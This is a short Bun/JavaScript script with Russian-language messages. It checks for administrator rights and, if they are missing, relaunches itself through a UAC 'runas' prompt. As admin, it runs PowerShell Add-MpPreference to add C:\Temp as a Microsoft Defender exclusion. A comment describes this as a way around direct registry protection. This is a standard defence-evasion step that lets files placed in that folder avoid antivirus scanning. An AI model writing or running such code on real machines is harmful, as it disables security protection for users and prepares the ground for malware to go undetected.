import { dlopen, FFIType, ptr } from "bun:ffi";

const shell32 = dlopen("shell32.dll", {
  ShellExecuteW: {
    args: [FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.i32],
    returns: FFIType.i32,
  },
});

const toPtr = (s) => ptr(Buffer.from(s + "\0", "utf16le"));

async function isAdmin() {
  try {
    const p = Bun.spawn({ cmd: ["net", "session"], stdout: "ignore", stderr: "ignore" });
    return (await p.exited) === 0;
  } catch (e) { return false; }
}

async function run() {
  const is_admin = await isAdmin();
  console.log(`🚀 PID: ${process.pid} | Admin: ${is_admin}`);

  if (is_admin) {
    console.log("✅ СЕССИЯ АДМИНА");
    const target = "C:\\Temp";
    
    // Используем PowerShell для обхода прямой защиты реестра
    const ps = Bun.spawn({
      cmd: ["powershell", "-Command", `Add-MpPreference -ExclusionPath '${target}' -ErrorAction Stop; "OK"`],
      stdout: "pipe",
      stderr: "pipe"
    });

    const err = await new Response(ps.stderr).text();
    if (await ps.exited === 0) {
      console.log(`✅ Исключение добавлено: ${target}`);
    } else {
      console.log("❌ ОШИБКА:", err.trim());
    }
  } else {
    console.log("❌ Не админ. Запрос UAC...");
    const scriptPath = process.cwd() + "\\" + "test.js";
    
    shell32.symbols.ShellExecuteW(
      0, toPtr("runas"), toPtr("bun.exe"), toPtr(`run "${scriptPath}"`), 0, 1
    );
    process.exit(0);
  }

  console.log("\nНажми Enter для выхода...");
  for await (const line of console) break;
}

// Запускаем основную функцию
run().catch(console.error);
